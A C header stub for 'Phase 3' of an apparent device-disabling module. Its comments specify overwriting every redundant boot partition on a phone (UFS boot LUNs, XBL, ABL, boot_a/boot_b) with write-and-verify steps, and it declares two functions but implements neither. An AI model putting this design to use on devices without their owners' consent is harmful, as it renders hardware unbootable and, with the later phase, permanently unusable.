/**
 * @file pkm_boot_corrupt.h
 * @brief Phase 3 — boot chain destruction (ALL redundant targets)
 *
 * CONTRACT:
 *   Corrupt EVERY target in the per-device table loaded from
 *   docs/HARDWARE.md: both UFS boot W-LUNs, XBL + XBL backup, ABL
 *   variants, boot_a + boot_b. FULL extents. (Post-mortem #2: the
 *   single 4 KB token write against a redundant boot chain — a coin
 *   flip that sometimes corrupts a partition table instead.)
 *
 *   Per target: write -> flush -> READ-BACK verify. Any verification
 *   failure = PKM_FAILED for the phase. No verification = no success.
 *
 *   IRREVERSIBILITY DOES NOT COME FROM THIS MODULE. Deterministic
 *   garbage is correct here — the signature check needs invalid bytes,
 *   not random ones. Permanence is Phase 4's job alone.
 *
 * CALLING ORDER: strictly after Phases 1–2, strictly before Phase 4.
 *
 * STATUS: STUB.
 */

#ifndef PKM_BOOT_CORRUPT_H
#define PKM_BOOT_CORRUPT_H

#include "pkm_types.h"

/* Load the per-device target table. Source of truth: docs/HARDWARE.md.
 * A device without a table entry must FAIL here — never improvise
 * offsets. */
pkm_result_t pkm_boot_load_targets(const pkm_storage_target_t **targets,
                                   size_t *count);

/* Corrupt + flush + read-back-verify every target in the table. */
pkm_result_t pkm_boot_corrupt_execute(void);

#endif /* PKM_BOOT_CORRUPT_H */
